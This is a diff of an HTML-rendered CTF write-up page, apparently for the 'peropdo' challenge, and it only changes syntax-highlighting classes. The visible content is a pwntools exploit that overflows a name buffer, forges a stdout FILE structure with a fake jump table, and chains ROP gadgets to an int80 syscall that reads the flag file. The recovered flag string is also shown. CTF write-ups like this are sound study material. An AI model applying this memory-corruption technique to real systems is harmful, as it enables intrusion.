@@ -345,11 +345,11 @@ call    do_main
 <span class="n">PORT</span> <span class="o">=</span> <span class="mi">80</span>
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./peropdo"</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
 </span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
 </span>
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
@@ -360,18 +360,18 @@ call    do_main
 </span>    <span class="n">func</span> <span class="o">=</span> <span class="mh">0x0806d7aa</span> <span class="c1"># avoid crash
 </span>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x08048b2a</span>
     <span class="n">name</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">scanf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">972</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf4</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">92</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf8</span><span class="p">)</span> 
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
     <span class="c1"># Later the program will call scanf("%s", stdout);
 </span>    <span class="c1"># now we can overwrite the whole stdout FILE structure
 </span>
     <span class="n">stream</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08079824</span><span class="p">)</span> <span class="c1"># second gadget: add esp, 0x84....
 </span>    <span class="n">stream</span> <span class="o">+=</span> <span class="s">"/home/peropdo/flag</span><span class="se">\x00</span><span class="s">"</span> <span class="c1"># flag path
-</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
     <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b45c</span><span class="p">)</span> <span class="c1"># eip, first gadget: xchg esp, eax ; ret
-</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
     <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080ED3E8</span><span class="p">)</span> <span class="c1"># pointer to null
-</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
     <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x807982b</span><span class="p">)</span> <span class="c1"># third gadget: pop; ret
 </span>    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80eb2a0</span><span class="p">)</span> <span class="c1"># fake jump table
 </span>    
@@ -408,8 +408,8 @@ call    do_main
 </span>                <span class="n">int80</span>
               <span class="p">)</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stream</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stream</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="language-plaintext highlighter-rouge">Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>
